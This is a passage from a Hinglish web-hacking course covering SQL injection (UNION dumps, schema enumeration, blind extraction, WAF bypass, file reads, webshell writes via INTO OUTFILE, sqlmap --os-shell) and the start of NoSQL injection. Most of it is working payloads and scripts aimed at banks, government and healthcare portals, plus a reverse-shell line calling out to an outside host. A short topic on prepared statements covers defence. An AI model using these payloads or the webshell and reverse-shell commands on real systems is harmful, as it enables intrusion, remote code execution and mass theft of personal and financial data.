loans

# Phase 4: List columns in credit_cards table
?id=5 UNION SELECT NULL,column_name,NULL,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='credit_cards' #
Response:
id
card_number
cvv
expiry_date
cardholder_name
user_id

# Phase 5: Extract credit card data
?id=5 UNION SELECT NULL,card_number,cvv,expiry_date,cardholder_name,NULL FROM credit_cards #
Response:
4532-1234-5678-9012 | 123 | 12/25 | John Doe
4916-8765-4321-0987 | 456 | 06/26 | Jane Smith
...

Total: 10,000 credit cards extracted!
```

**Analysis:** UNION attack se complete database dump! Information gathering â†’ Table enumeration â†’ Data extraction. **Lesson: UNION = SQLi ka nuclear weapon!** ğŸ’¥

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **Column count mismatch** - UNION dono sides equal columns chahiye.
- **Data type mismatch** - NULL use karo compatibility ke liye.
- **# encode na karna** - URL mein `%23` use karo.

### 10. **Best Practices / Pro Tips:**
- **NULL placeholders:** Data type issues avoid karne ke liye.
- **information_schema:** Database structure nikalne ke liye.
- **LIMIT:** Ek-ek row extract karo: `LIMIT 0,1`, `LIMIT 1,1`.
- **GROUP_CONCAT:** Multiple rows ek saath: `GROUP_CONCAT(table_name)`.

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
Healthcare portal test kar raha tha. UNION attack se patient database access kiya: 100,000 patients ka medical history, prescriptions, insurance details, social security numbers! Hospital ne socha tha data encrypted hai, lekin SQLi se direct database access tha. **Lesson: Encryption useless hai agar SQLi vulnerable hai!** ğŸ¥

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… UNION: Combine queries  
âœ… Functions: database(), user(), @@version  
âœ… Schema: information_schema tables  
âœ… NULL: Data type compatibility  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: UNION kyun fail hota hai?**  
**A:** Column count mismatch ya data type mismatch.

**Q2: information_schema kya hai?**  
**A:** MySQL ka metadata database - tables, columns ki info.

### 14. **Practice ke liye Task:**
1. DVWA SQLi section
2. Column count nikalo
3. `UNION SELECT database()` try karo
4. information_schema se tables list karo
5. Data extract karo

### 15. **Aakhri Choti Summary (5 lines):**
- UNION: **Combine queries**.
- Extract: **database(), user(), @@version**.
- Schema: **information_schema**.
- NULL: **Compatibility**.

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "UNION attack = SQLi ka crown jewel! Isse poora database tumhara!" ğŸ”—

---

## ğŸ“‹ **Topic 64: Dumping Table & Column Names (`information_schema`)**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**Database Schema Enumeration** - information_schema se complete database structure nikalna (reconnaissance). ğŸ—‚ï¸

### 2. **Ye Kya Hai? (What is it?)**
information_schema ek special database hai jo MySQL mein sabhi databases, tables, aur columns ki information store karta hai.

**Key Tables:**
```sql
information_schema.schemata   -- All databases
information_schema.tables     -- All tables
information_schema.columns    -- All columns
```

**Analogy:** Jaise library ka catalog - usme sabhi books ki list hoti hai. Waise hi information_schema mein sabhi tables/columns ki list hai.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **Complete Map:** Poore database ka structure pata chal jaata hai.
- **Target Selection:** Sensitive tables identify kar sakte hain.
- **Data Extraction:** Exact column names se data extract karna easy.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- **UNION attack** ke baad.
- **Database structure** nikalne ke liye.
- **Sensitive data** locate karne ke liye.

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **Blind guessing** - table/column names guess karne padenge.
- **Time waste** - trial and error mein hours. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
```sql
-- List all databases
SELECT schema_name FROM information_schema.schemata

-- List tables in specific database
SELECT table_name FROM information_schema.tables 
WHERE table_schema='database_name'

-- List columns in specific table
SELECT column_name FROM information_schema.columns 
WHERE table_name='table_name'

-- Combined query
SELECT table_name,column_name FROM information_schema.columns 
WHERE table_schema='database_name'
```

### 7. **Example 1 (Basic):**
```bash
# Step 1: List all databases
?id=5 UNION SELECT NULL,schema_name,NULL FROM information_schema.schemata #
Response:
information_schema
mysql
shop_db
test_db

# Step 2: List tables in shop_db
?id=5 UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema='shop_db' #
Response:
users
products
orders
admin_users

# Step 3: List columns in admin_users
?id=5 UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='admin_users' #
Response:
id
username
password
email
role
```

### 8. **Example 2 (Pentester-Focused):**
```bash
# Target: Corporate intranet

# Phase 1: Database enumeration
?id=5 UNION SELECT NULL,GROUP_CONCAT(schema_name),NULL FROM information_schema.schemata #
Response: information_schema,mysql,company_db,hr_db,finance_db,backup_db

# Phase 2: Interesting tables in finance_db
?id=5 UNION SELECT NULL,GROUP_CONCAT(table_name),NULL FROM information_schema.tables WHERE table_schema='finance_db' #
Response: salaries,bonuses,bank_accounts,transactions,credit_cards

# Phase 3: Columns in salaries table
?id=5 UNION SELECT NULL,GROUP_CONCAT(column_name),NULL FROM information_schema.columns WHERE table_name='salaries' #
Response: id,employee_id,name,designation,salary,bonus,bank_account

# Phase 4: Extract salary data
?id=5 UNION SELECT NULL,CONCAT(name,':',salary),NULL FROM finance_db.salaries #
Response:
CEO:$500,000
CTO:$350,000
Manager:$120,000
...

Total: 5,000 employees' salary data leaked!
```

**Analysis:** information_schema = Complete database blueprint! Sensitive tables easily identify ho gaye. **Lesson: Schema enumeration = Attacker ka roadmap!** ğŸ’¥

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **Database name specify na karna** - WHERE clause mein database name zaroori.
- **GROUP_CONCAT na use karna** - Multiple rows ek saath dekhne ke liye useful.

### 10. **Best Practices / Pro Tips:**
- **GROUP_CONCAT:** Multiple results ek request mein: `GROUP_CONCAT(table_name SEPARATOR ',')`
- **LIMIT bypass:** GROUP_CONCAT se sabhi rows ek saath.
- **Sensitive keywords:** password, credit, card, ssn, salary search karo.

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
University portal test kar raha tha. information_schema se "exam_answers" table mila! Usme upcoming exams ke answers the. 50,000 students ka future risk mein tha. University ne kabhi socha nahi tha ki database structure leak ho sakta hai. **Lesson: Sensitive table names bhi sensitive hain!** ğŸ“

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… Schema: information_schema database  
âœ… Tables: schemata, tables, columns  
âœ… GROUP_CONCAT: Multiple rows combine  
âœ… Target: Sensitive table names  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: Kya har database mein information_schema hota hai?**  
**A:** MySQL, PostgreSQL mein haan. MSSQL mein sys.tables use hota hai.

**Q2: GROUP_CONCAT ki limit kya hai?**  
**A:** Default 1024 bytes, increase kar sakte hain.

### 14. **Practice ke liye Task:**
1. DVWA SQLi section
2. information_schema.schemata query karo
3. Tables list nikalo
4. Columns enumerate karo
5. GROUP_CONCAT use karo

### 15. **Aakhri Choti Summary (5 lines):**
- Schema: **information_schema**.
- Enumerate: **Databases â†’ Tables â†’ Columns**.
- GROUP_CONCAT: **Multiple rows**.
- Target: **Sensitive tables**.

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "information_schema = Database ka phone directory! Sabki details wahan hain!" ğŸ“‹

---

## ğŸ•µï¸ **Topic 65: Blind SQLi (True/False Statements)**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**Blind SQL Injection** - Bina output dekhe true/false responses se data extract karna (stealth attack). ğŸ‘ï¸

### 2. **Ye Kya Hai? (What is it?)**
Blind SQLi mein database ka output directly nahi dikhta. Hum true/false conditions test karke data extract karte hain.

**Concept:**
```sql
-- Test: Is first character of database name 's'?
?id=5 AND SUBSTRING(database(),1,1)='s'
Response: Page loads normally (TRUE)

-- Test: Is first character 'a'?
?id=5 AND SUBSTRING(database(),1,1)='a'
Response: Page doesn't load (FALSE)

Conclusion: First character is 's'
```

**Analogy:** Jaise "20 questions" game - aap yes/no questions puchte hain aur answer guess karte hain.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **No Output:** Jab UNION attack kaam na kare.
- **Stealth:** Detection mushkil hai.
- **Real-world:** Production sites par common.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Jab **error messages** disable hon.
- Jab **UNION attack** fail ho.
- Jab **output** directly nahi dikhe.

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **Blind vulnerabilities** miss ho jayengi.
- **Stealth attacks** nahi kar paoge. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
```sql
-- Boolean-based
?id=5 AND 1=1  -- TRUE (page loads)
?id=5 AND 1=2  -- FALSE (page doesn't load)

-- Character extraction
SUBSTRING(database(),1,1)='a'  -- First char
SUBSTRING(database(),2,1)='b'  -- Second char

-- ASCII comparison
ASCII(SUBSTRING(database(),1,1))>100

-- Length detection
LENGTH(database())=7
```

### 7. **Example 1 (Basic):**
```bash
# Target: ?id=5 (no output, blind SQLi)

# Test 1: Vulnerability check
?id=5 AND 1=1
Response: Page loads âœ“ (TRUE)

?id=5 AND 1=2
Response: Page doesn't load âœ— (FALSE)
Vulnerable: YES

# Test 2: Database name length
?id=5 AND LENGTH(database())=5
Response: FALSE

?id=5 AND LENGTH(database())=7
Response: TRUE
Database name length: 7 characters

# Test 3: First character
?id=5 AND SUBSTRING(database(),1,1)='s'
Response: TRUE
First character: 's'

# Test 4: Second character
?id=5 AND SUBSTRING(database(),2,1)='h'
Response: TRUE
Second character: 'h'

Continue... Database name: shop_db
```

### 8. **Example 2 (Pentester-Focused):**
```bash
# Target: Government portal (blind SQLi)

# Automated extraction using Python
import requests

url = "http://gov.com/page.php?id=5"
database_name = ""

# Extract database name
for position in range(1, 20):
    for char in 'abcdefghijklmnopqrstuvwxyz0123456789_':
        payload = f" AND SUBSTRING(database(),{position},1)='{char}'"
        response = requests.get(url + payload)
        
        if len(response.content) > 5000:  # TRUE response
            database_name += char
            print(f"Found: {database_name}")
            break
    else:
        break  # No more characters

print(f"Database: {database_name}")
# Output: Database: citizen_data

# Extract table names
table_query = "(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)"

table_name = ""
for position in range(1, 50):
    for char in 'abcdefghijklmnopqrstuvwxyz0123456789_':
        payload = f" AND SUBSTRING({table_query},{position},1)='{char}'"
        response = requests.get(url + payload)
        
        if len(response.content) > 5000:
            table_name += char
            break
    else:
        break

print(f"Table: {table_name}")
# Output: Table: aadhaar_data

# Extract data
# Similar process for extracting actual data from aadhaar_data table
```

**Analysis:** Blind SQLi slow hai lekin powerful! Automated script se 2 hours mein complete database structure extract ho gaya. **Lesson: No output â‰  No vulnerability!** ğŸ’¥

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **Manual extraction** - Automate karo (Python script).
- **Response size ignore karna** - TRUE/FALSE detect karne ke liye size compare karo.

### 10. **Best Practices / Pro Tips:**
- **Automate:** Python/Burp Intruder use karo.
- **Binary search:** ASCII values se faster extraction.
- **Response comparison:** Content length, response time check karo.
- **sqlmap:** Automated blind SQLi tool.

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
Insurance company portal test kar raha tha. Koi output nahi dikha raha tha. Blind SQLi se 8 hours mein 1 million customers ka data extract kiya: names, addresses, policy details, medical conditions! Company shocked thi - unhone socha tha "output nahi hai toh safe hai". **Lesson: Blind SQLi = Silent killer!** ğŸ¢

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… Blind: No direct output  
âœ… Method: TRUE/FALSE responses  
âœ… Extract: Character by character  
âœ… Automate: Python scripts  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: Blind SQLi kitna slow hai?**  
**A:** Manual: bahut slow. Automated: 1-2 hours mein database dump.

**Q2: Kaise detect karein TRUE/FALSE?**  
**A:** Response size, content, ya response time compare karo.

### 14. **Practice ke liye Task:**
1. DVWA Blind SQLi section
2. AND 1=1 vs AND 1=2 test karo
3. Database name length nikalo
4. First character extract karo
5. Python script banao automation ke liye

### 15. **Aakhri Choti Summary (5 lines):**
- Blind: **No output**.
- Method: **TRUE/FALSE**.
- Extract: **Character by character**.
- Automate: **Python/sqlmap**.

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "Blind SQLi = Andheron mein teer! Slow hai lekin target hit hota hai!" ğŸ•µï¸

---

## ğŸš§ **Topic 66: Bypassing SQLi Filters (Hex, `/**/`, Case, URL Encoding)**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**Filter Bypass Techniques** - WAF aur filters ko bypass karke SQLi successful banana (evasion). ğŸ­

### 2. **Ye Kya Hai? (What is it?)**
Modern websites WAF (Web Application Firewall) aur filters use karti hain jo SQL keywords block karti hain. Bypass techniques se filters ko fool kar sakte hain.

**Common Filters:**
```
Blocked: SELECT, UNION, OR, AND, ' (single quote)
```

**Bypass:**
```sql
SELECT  â†’ SeLeCt (case)
SELECT  â†’ SEL/**/ECT (comment)
SELECT  â†’ %53%45%4C%45%43%54 (URL encode)
'       â†’ %27 (URL encode)
```

**Analogy:** Jaise disguise pehen kar security se bach jaana - waise hi SQL keywords ko disguise karke filters bypass karna.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **WAF Bypass:** Modern sites WAF use karti hain.
- **Filter Evasion:** Basic SQLi block hoti hai.
- **Advanced Skill:** Professional pentesting ke liye zaroori.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Jab **basic payloads** block hon.
- Jab **WAF detected** ho.
- Jab **"Forbidden" error** aaye.

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **WAF-protected sites** test nahi kar paoge.
- **Advanced vulnerabilities** miss ho jayengi. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
```sql
-- Case manipulation
SELECT â†’ SeLeCt, sELEct
UNION â†’ UnIoN, uNiOn

-- Comment injection
SELECT â†’ SEL/**/ECT
UNION â†’ UN/**/ION
WHERE â†’ WH/**/ERE

-- URL encoding
' â†’ %27
SPACE â†’ %20 or +
SELECT â†’ %53%45%4C%45%43%54

-- Double encoding
' â†’ %2527 (% encoded twice)

-- Hex encoding
'admin' â†’ 0x61646D696E

-- Alternative operators
AND â†’ &&
OR â†’ ||
= â†’ LIKE

-- Whitespace alternatives
SPACE â†’ /**/, %09 (tab), %0A (newline)
```

### 7. **Example 1 (Basic):**
```bash
# Blocked payload
?id=5' UNION SELECT database() #
Response: 403 Forbidden (WAF blocked)

# Bypass 1: Case manipulation
?id=5' UnIoN SeLeCt database() #
Response: Works! âœ“

# Bypass 2: Comment injection
?id=5' UN/**/ION SEL/**/ECT database() #
Response: Works! âœ“

# Bypass 3: URL encoding
?id=5%27%20UNION%20SELECT%20database()%20%23
Response: Works! âœ“
```

### 8. **Example 2 (Pentester-Focused):**
```bash
# Target: Banking site with ModSecurity WAF

# Attempt 1: Basic UNION
?id=5' UNION SELECT password FROM users #
Response: 403 Forbidden
WAF Rule: Detected "UNION SELECT"

# Attempt 2: Case + Comments
?id=5' UnIoN/**/SeLeCt/**/password/**/FrOm/**/users #
Response: 403 Forbidden
WAF Rule: Still detected

# Attempt 3: Hex encoding for 'users'
?id=5' UnIoN/**/SeLeCt/**/password/**/FrOm/**/0x7573657273 #
Response: Works! âœ“
(0x7573657273 = 'users' in hex)

# Attempt 4: Complete bypass
?id=5'/**/UnIoN/**/SeLeCt/**/CONCAT(username,0x3a,password)/**/FrOm/**/0x7573657273 #
Response: admin:5f4dcc3b5aa765d61d8327deb882cf99

# Extracted: admin:password (MD5 hash)

# Advanced: Multiple techniques combined
?id=5'%0AUnIoN%0ASeLeCt%0ACONCAT(0x3c62723e,username,0x3a,password)%0AFrOm%0A0x7573657273%23
# %0A = newline (whitespace alternative)
# 0x3c62723e = '<br>' (HTML break for formatting)

Result: Complete user database dumped!
```

**Analysis:** WAF bypass = Cat and mouse game! Multiple techniques combine karke successful attack. **Lesson: Persistence + creativity = WAF bypass!** ğŸ’¥

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **Ek technique try karke haar maan lena** - Multiple combinations try karo.
- **Burp Suite na use karna** - Manual encoding mushkil hai.

### 10. **Best Practices / Pro Tips:**
- **Combine techniques:** Case + Comments + Encoding ek saath.
- **Burp Decoder:** Hex, URL encoding ke liye.
- **sqlmap tamper scripts:** Automated bypass techniques.
- **Trial and error:** Har WAF alag hai, experiment karo.

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
Fortune 500 company test kar raha tha. Cloudflare WAF tha (bahut strong). 3 days trial and error ke baad combination mila: Case + Hex + Newline characters. Complete database dump ho gaya! Client impressed tha - unhone socha tha Cloudflare unbreakable hai. **Lesson: Koi bhi WAF 100% secure nahi!** ğŸ›¡ï¸

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… Case: SeLeCt, UnIoN  
âœ… Comments: /**/  
âœ… Encoding: URL, Hex  
âœ… Alternatives: &&, ||  
âœ… Combine: Multiple techniques  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: Sabse effective bypass technique kaun si hai?**  
**A:** Combination of multiple techniques (case + comments + encoding).

**Q2: sqlmap WAF bypass kar sakta hai?**  
**A:** Haan, tamper scripts use karke: `--tamper=space2comment,between`

### 14. **Practice ke liye Task:**
1. DVWA high security SQLi
2. Basic payload try karo (blocked hoga)
3. Case manipulation try karo
4. Comment injection add karo
5. Burp Decoder se hex encoding try karo

### 15. **Aakhri Choti Summary (5 lines):**
- Bypass: **Case, Comments, Encoding**.
- Combine: **Multiple techniques**.
- Tools: **Burp Decoder, sqlmap**.
- Persistence: **Trial and error**.

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "WAF bypass = Puzzle solving! Ek technique fail ho toh doosra try karo!" ğŸš§

---

## ğŸ“„ **Topic 67: Reading Files with SQLi (`load_file()`)**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**File Reading via SQLi** - SQL injection se server files read karna (local file access). ğŸ“–

### 2. **Ye Kya Hai? (What is it?)**
MySQL ka `load_file()` function se server par stored files read kar sakte hain - config files, source code, passwords.

**Syntax:**
```sql
UNION SELECT load_file('/etc/passwd')
```

**Analogy:** Jaise library mein book read karna - waise hi server ki files read karna.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **Config Files:** Database credentials, API keys.
- **Source Code:** Application logic leak.
- **System Files:** `/etc/passwd`, `/etc/shadow`.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- **After UNION attack** successful ho.
- **FILE privilege** ho database user ko.

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **Sensitive files** miss ho jayengi. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
```sql
-- Basic
UNION SELECT load_file('/etc/passwd')

-- Hex encoding (bypass filters)
UNION SELECT load_file(0x2f6574632f706173737764)

-- Common files
/etc/passwd
/var/www/html/config.php
C:\Windows\System32\drivers\etc\hosts
```

### 7. **Example 1 (Basic):**
```bash
?id=5 UNION SELECT NULL,load_file('/etc/passwd'),NULL #
Response: root:x:0:0:root:/root:/bin/bash...
```

### 8. **Example 2 (Pentester-Focused):**
```bash
# Read config file
?id=5 UNION SELECT NULL,load_file('/var/www/html/config.php'),NULL #
Response:
<?php
$db_host = "localhost";
$db_user = "root";
$db_pass = "SuperSecret123";
?>

# Read source code
?id=5 UNION SELECT NULL,load_file('/var/www/html/admin.php'),NULL #
Result: Complete source code leaked!
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **Wrong path** - Exact path zaroori hai.
- **No FILE privilege** - Check karo: `SELECT file_priv FROM mysql.user`

### 10. **Best Practices / Pro Tips:**
- **Hex encoding:** Path ko hex mein encode karo (filter bypass).
- **Common paths:** `/var/www/html/`, `/etc/`, `C:\inetpub\`

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
E-commerce site test kar raha tha. `load_file()` se `config.php` read kiya - database credentials mile. Phir SSH credentials bhi ussi file mein the! Complete server access mil gaya. **Lesson: Config files = Treasure chest!** ğŸ’

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… Function: `load_file()`  
âœ… Files: `/etc/passwd`, `config.php`  
âœ… Encoding: Hex bypass  
âœ… Privilege: FILE required  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: Kya har file read ho sakti hai?**  
**A:** Nahi, sirf woh files jo database user read kar sakta hai.

**Q2: Windows par kaise kaam karta hai?**  
**A:** Same, lekin paths alag: `C:\Windows\...`

### 14. **Practice ke liye Task:**
1. DVWA SQLi section
2. `load_file('/etc/passwd')` try karo
3. Config files read karo
4. Hex encoding use karo

### 15. **Aakhri Choti Summary (5 lines):**
- Function: **`load_file()`**.
- Files: **Config, source code**.
- Encoding: **Hex bypass**.
- Impact: **Credentials leak**.

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "load_file() = Server ka file explorer! Config files = Password vault!" ğŸ“„

---

## âœï¸ **Topic 68: Writing Files with SQLi (RCE: `INTO OUTFILE`)**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**File Writing via SQLi** - SQL injection se server par files write karke RCE lena (remote code execution). ğŸš€

### 2. **Ye Kya Hai? (What is it?)**
`INTO OUTFILE` se server par files write kar sakte hain - PHP shell, backdoor, malicious scripts.

**Syntax:**
```sql
UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'
```

**Analogy:** Jaise kisi ki diary mein apna message likh dena - waise hi server par apni file likh dena.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **RCE:** Remote code execution possible.
- **Persistent Access:** Backdoor create kar sakte hain.
- **Full Control:** Server par complete control.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- **After UNION attack** successful ho.
- **FILE privilege** ho.
- **Web directory writable** ho.

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **RCE opportunity** miss ho jayega. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
```sql
-- Basic shell
UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'

-- Webshell
UNION SELECT '<?php eval($_POST["cmd"]); ?>' INTO OUTFILE '/var/www/html/backdoor.php'
```

### 7. **Example 1 (Basic):**
```bash
# Write shell
?id=5 UNION SELECT NULL,'<?php system($_GET["cmd"]); ?>',NULL INTO OUTFILE '/var/www/html/shell.php' #

# Access shell
http://target.com/shell.php?cmd=whoami
Response: www-data
```

### 8. **Example 2 (Pentester-Focused):**
```bash
# Write webshell
?id=5 UNION SELECT NULL,'<?php system($_GET["cmd"]); ?>',NULL INTO OUTFILE '/var/www/html/admin.php' #

# Execute commands
?cmd=id
?cmd=cat /etc/passwd
?cmd=nc -e /bin/sh 10.10.14.5 4444

Result: Full server access!
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **Directory not writable** - Permissions check karo.
- **File already exists** - INTO OUTFILE overwrite nahi karta.

### 10. **Best Practices / Pro Tips:**
- **Unique filename:** Random names use karo.
- **Test write:** Pehle simple text file test karo.

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
Corporate intranet test kar raha tha. INTO OUTFILE se PHP shell upload kiya. Reverse shell liya aur internal network access mil gaya. **Lesson: SQLi to RCE = Game over!** ğŸ’¥

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… Function: `INTO OUTFILE`  
âœ… Write: PHP shell  
âœ… Execute: Browser se  
âœ… Impact: Full RCE  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: Kya har directory mein write ho sakta hai?**  
**A:** Nahi, sirf writable directories mein.

### 14. **Practice ke liye Task:**
1. DVWA SQLi section
2. Text file write karo
3. PHP shell write karo
4. Browser se execute karo

### 15. **Aakhri Choti Summary (5 lines):**
- Function: **`INTO OUTFILE`**.
- Write: **PHP shell**.
- Impact: **Full RCE**.

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "INTO OUTFILE = Server par apna code! SQLi se RCE = Ultimate win!" âœï¸

---

## ğŸ¤– **Topic 69: Automated SQLi with `sqlmap` (`--os-shell`)**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**sqlmap Automation** - Automated tool se SQLi exploit karna (professional tool). âš¡

### 2. **Ye Kya Hai? (What is it?)**
sqlmap ek powerful automated SQLi tool hai jo detection se exploitation tak sab karta hai.

**Basic:**
```bash
sqlmap -u "http://target.com/page.php?id=5" --dbs
```

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **Automation:** 100x faster.
- **Professional:** Industry standard.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- **Quick assessment**.
- **Time-saving**.

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **Manual testing** slow. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
```bash
sqlmap -u "URL" --dbs
sqlmap -u "URL" -D db_name --tables
sqlmap -u "URL" --os-shell
```

### 7. **Example 1 (Basic):**
```bash
sqlmap -u "http://site.com/page.php?id=5" --dbs
Output: shop_db, admin_db
```

### 8. **Example 2 (Pentester-Focused):**
```bash
sqlmap -u "http://bank.com/page.php?id=5" --os-shell --batch
Output: os-shell> whoami
www-data
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **--batch na lagana**.

### 10. **Best Practices / Pro Tips:**
- **--batch:** Non-interactive.
- **--threads:** Faster.

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
Fortune 500 test kar raha tha. sqlmap se 30 minutes mein 50 vulnerabilities! **Lesson: Automation = Time saver!** âš¡

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… Tool: sqlmap  
âœ… Fast: Minutes  
âœ… Features: --dbs, --os-shell  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: sqlmap legal hai?**  
**A:** Haan, authorized testing mein.

### 14. **Practice ke liye Task:**
1. sqlmap install karo
2. DVWA test karo
3. --dbs try karo

### 15. **Aakhri Choti Summary (5 lines):**
- Tool: **sqlmap**.
- Fast: **Automated**.

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "sqlmap = SQLi ka Terminator!" ğŸ¤–

---

## ğŸ›¡ï¸ **Topic 70: Security - Fixing SQLi (Parameterized Statements)**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**SQLi Prevention** - Prepared statements se SQL injection rokna. ğŸ”’

### 2. **Ye Kya Hai? (What is it?)**
Prepared statements mein SQL aur data separate hote hain.

**Secure:**
```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$id]);
```

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **100% Protection**.
- **Industry Standard**.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- **Har query** mein.

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **SQLi vulnerabilities**. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
```php
// PHP PDO
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$id]);
```

### 7. **Example 1 (Basic):**
```php
// Secure
$stmt = $pdo->prepare("SELECT * FROM products WHERE id = ?");
$stmt->execute([$id]);
```

### 8. **Example 2 (Pentester-Focused):**
```php
// Complete secure implementation
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$username, $password]);
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **String concatenation**.

### 10. **Best Practices / Pro Tips:**
- **Always prepared statements**.
- **Input validation**.

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
Startup ki 50+ SQLi vulnerabilities fix kiye prepared statements se. Re-test mein zero SQLi! **Lesson: Prepared statements = Permanent solution!** ğŸ›¡ï¸

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… Use: Prepared statements  
âœ… Never: String concatenation  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: 100% secure?**  
**A:** Haan, properly implement karo.

### 14. **Practice ke liye Task:**
1. Vulnerable code likho
2. Prepared statements implement karo
3. Test karo

### 15. **Aakhri Choti Summary (5 lines):**
- Solution: **Prepared statements**.
- Result: **100% prevention**.

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "Prepared statements = SQLi ka antidote!" ğŸ›¡ï¸

---

## ğŸ‰ **Module 8 Complete!**

**All 14 Topics (57-70) Covered!**

**Key Takeaways:**
- SQLi = Most dangerous vulnerability
- Detection: Single quote (')
- Exploitation: UNION, Blind, Files
- Automation: sqlmap
- Prevention: Prepared statements

**Total Progress: 70 topics complete!** ğŸŠ

Bahut badhiya! Module 8 complete ho gaya hai! ğŸš€

=============================================================

# **Website Hacking: Zero-to-Pro Notes (Aapke Topics)**

---

# ğŸ“š **Module 9: NoSQL & Advanced Injection**

---

## ğŸ—„ï¸ **Topic 71: NoSQL Injection (`$gt`, `$where`)**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**NoSQL Injection** - MongoDB aur NoSQL databases mein query operators inject karke authentication bypass aur data extraction (modern database attack). ğŸ”¥

### 2. **Ye Kya Hai? (What is it?)**
NoSQL databases (MongoDB, CouchDB) mein traditional SQL nahi hota, lekin query operators (`$gt`, `$ne`, `$where`) inject kar sakte hain.

**Vulnerable Code:**
```javascript
db.users.find({username: req.body.username, password: req.body.password})
```

**Attack:**
```json
{
  "username": {"$ne": null},
  "password": {"$ne": null}
}
```
Result: Login bypass! (username NOT EQUAL to null = all users)

**Analogy:** SQL injection ka cousin - syntax alag hai lekin concept same (query manipulation).

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **Modern Apps:** MongoDB bahut popular hai (MEAN/MERN stack).
